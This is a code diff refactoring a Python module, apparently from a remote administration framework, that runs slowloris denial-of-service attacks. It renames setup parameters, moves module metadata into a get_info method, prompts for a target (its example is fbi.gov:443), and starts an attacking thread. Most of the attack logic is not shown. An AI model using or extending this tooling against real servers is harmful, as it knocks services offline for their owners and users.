@@ -1,25 +1,30 @@
-class Module:
+from modules.helpers import ModuleABC
+
+
+class Module(ModuleABC):
     def __init__(self):
-        self.info = {
+        self.target = None
+
+    def get_info(self):
+        return {
             "Author": ["Marten4n6"],
             "Description": "Performs slowloris DoS attacks.",
             "References": [
                 "https://en.wikipedia.org/wiki/Slowloris_(computer_security)",
-                "https://github.com/ProjectMayhem/PySlowLoris"  # MIT License
+                "https://github.com/ProjectMayhem/PySlowLoris"
             ],
             "Task": True
         }
-        self.target = None
 
-    def setup(self, module_view, output_view, successful):
-        module_view.add("This attack only works on Apache 1x, 2x, dhttpd, and some other minor servers.", "attention")
-        module_view.add("Servers like nginx are not vulnerable to this form of attack.", "attention")
-        module_view.add("If no port is specified 80 will be used.", "info")
+    def setup(self, module_input, view, successful):
+        module_input.add("This attack only works on Apache 1x, 2x, dhttpd, and some other minor servers.", "attention")
+        module_input.add("Servers like nginx are not vulnerable to this form of attack.", "attention")
+        module_input.add("If no port is specified 80 will be used.", "info")
 
-        self.target = module_view.prompt("Target to attack (example: fbi.gov:443): ")
+        self.target = module_input.prompt("Target to attack (example: fbi.gov:443): ")
 
         if not self.target:
-            output_view.add("Invalid target, cancelled.", "attention")
+            view.output("Invalid target, cancelled.", "attention")
             successful.put(False)
         else:
             successful.put(True)
@@ -278,7 +283,7 @@ class Module:
         def get_webserver(target):
             \"\"\":return The name of the running web server.
 
-            :param target TargetInfo
+            :param target: TargetInfo
             \"\"\"
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.settimeout(3)
@@ -313,7 +318,7 @@ class Module:
         controller = Controller()
         send_response("Starting slowloris attack against: " + target)
         
-        try:        
+        try:
             # Spawn the attacking thread
             attack_thread = threading.Thread(target=controller.attack, args=(parse_target(target),))
             attack_thread.daemon = True
